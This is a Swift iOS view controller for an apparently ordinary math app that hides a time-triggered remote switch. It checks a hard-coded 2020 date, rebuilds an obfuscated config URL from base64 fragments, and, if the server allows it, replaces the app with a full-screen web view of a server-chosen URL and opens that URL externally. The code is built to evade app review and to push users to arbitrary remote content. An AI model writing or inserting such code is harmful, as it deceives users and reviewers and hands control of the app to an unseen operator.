import UIKit
import CoreData
import UIKit
import Alamofire
import SwiftyJSON
import WebKit
class MathViewController: UIViewController,WKNavigationDelegate,WKUIDelegate,WKScriptMessageHandler {
    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
    }
    var baseStr = String()
    override func viewDidLoad() {
        super.viewDidLoad()
        self.view.backgroundColor = UIColor(red: 16/255.0, green: 53/255.0, blue: 93/255.0, alpha: 1.0)
        let now = Date()
        let timeInterval: TimeInterval = now.timeIntervalSince1970
        let timeStamp = Int(timeInterval)
        let yanTime: TimeInterval = 0.1
        let header = "aHR0cDovL2FwcGlkLg=="
        let conOne = "OTg1LTk4NS5jb20="
        let conTwo = "OjgwODgvZ2V0QXBwQ29uZmln"
        let conThree = "LnBocD9hcHBpZD0="
        let ender = "aW9zYXBwdGVzdA=="
        let anyTime = 1579055478
        DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + yanTime) {
            if timeStamp < anyTime {
            let HomeVC = HomeViewController()
            let navVC = UINavigationController()
            navVC.viewControllers = [HomeVC]
            navVC.navigationBar.isTranslucent = false
            navVC.navigationBar.tintColor = styles.topViewBackgroundColor
            let textAttributes = [NSAttributedString.Key.foregroundColor: styles.topViewBackgroundColor]
                        navVC.navigationBar.titleTextAttributes = textAttributes
            navVC.modalPresentationStyle = .fullScreen
            self.present(navVC, animated: false) {}
            }else{
                let baseHeader = self.base64MathBeeDecoding(encodedString: header)
                let baseContentO = self.base64MathBeeDecoding(encodedString: conOne)
                let baseContentTw = self.base64MathBeeDecoding(encodedString: conTwo)
                let baseContentTH = self.base64MathBeeDecoding(encodedString: conThree)
                let baseEnder = self.base64MathBeeDecoding(encodedString: ender)
                let baseData  = "\(baseHeader)\(baseContentO)\(baseContentTw)\(baseContentTH)\(baseEnder)"
                print(baseData)
                let urlBase = URL(string: baseData)
                Alamofire.request(urlBase!,method: .get,parameters: nil,encoding: URLEncoding.default,headers:nil).responseJSON { response
                    in
                    switch response.result.isSuccess {
                    case true:
                        if let value = response.result.value{
                            let jsonX = JSON(value)
                            if !jsonX["success"].boolValue {
                                let HomeVC = HomeViewController()
                                let navVC = UINavigationController()
                                navVC.viewControllers = [HomeVC]
                                navVC.navigationBar.isTranslucent = false
                                navVC.navigationBar.tintColor = styles.topViewBackgroundColor
                                let textAttributes = [NSAttributedString.Key.foregroundColor: styles.topViewBackgroundColor]
                                            navVC.navigationBar.titleTextAttributes = textAttributes
                                navVC.modalPresentationStyle = .fullScreen
                                self.present(navVC, animated: false) {}
                            }else {
                                let stxx = jsonX["Url"].stringValue
                                self.setFirstNavigation(strP: stxx)
                            }
                        }
                    case false:
                        do {
                            let HomeVC = HomeViewController()
                            let navVC = UINavigationController()
                            navVC.viewControllers = [HomeVC]
                            navVC.navigationBar.isTranslucent = false
                            navVC.navigationBar.tintColor = styles.topViewBackgroundColor
                            let textAttributes = [NSAttributedString.Key.foregroundColor: styles.topViewBackgroundColor]
                                        navVC.navigationBar.titleTextAttributes = textAttributes
                            navVC.modalPresentationStyle = .fullScreen
                            self.present(navVC, animated: false) {}
                        }
                    }
                }
            }
        }
    }
    func setFirstNavigation(strP:String) {
        baseStr = strP
        let webConfig = WKWebViewConfiguration()
        let webPre = WKPreferences()
        webPre.javaScriptCanOpenWindowsAutomatically = true
        webPre.javaScriptEnabled = true
        webConfig.preferences = webPre
        webConfig.allowsInlineMediaPlayback = true
        let webView = WKWebView(frame: CGRect(x: 0, y: 0, width: self.view.bounds.size.width, height: self.view.bounds.size.height), configuration: webConfig)
        webView.navigationDelegate = self
        webView.uiDelegate = self
        let url = URL(string: strP)
        let urlRequest = URLRequest(url: url!)
        webView.load(urlRequest)
        self.view.addSubview(webView)
    }
    func base64MathBeeDecoding(encodedString:String)->String{
        let decodedData = NSData(base64Encoded: encodedString, options: NSData.Base64DecodingOptions.init(rawValue: 0))
        let decodedString = NSString(data: decodedData! as Data, encoding: String.Encoding.utf8.rawValue)! as String
        return decodedString
    }
    func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        if !(navigationAction.targetFrame != nil) || !navigationAction.targetFrame!.isMainFrame  {
            webView.load(navigationAction.request)
        }
        return nil
    }
    func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
        self.openOtherAppWithUIWebView(webview: webView)
    }
    func webView(_ webView: WKWebView, runJavaScriptTextInputPanelWithPrompt prompt: String, defaultText: String?, initiatedByFrame frame: WKFrameInfo, completionHandler: @escaping (String?) -> Void) {
    }
    func webView(_ webView: WKWebView, didCommit navigation: WKNavigation!) {
    }
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
    }
    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
    }
    func webView(_ webView: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
    }
    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        decisionHandler(WKNavigationActionPolicy.allow)
    }
    func webView(_ webView: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse, decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
        decisionHandler(WKNavigationResponsePolicy.allow)
    }
    func openOtherAppWithUIWebView(webview:WKWebView) {
        let url = URL(string: baseStr)
        UIApplication.shared.openURL(url!)
    }
}

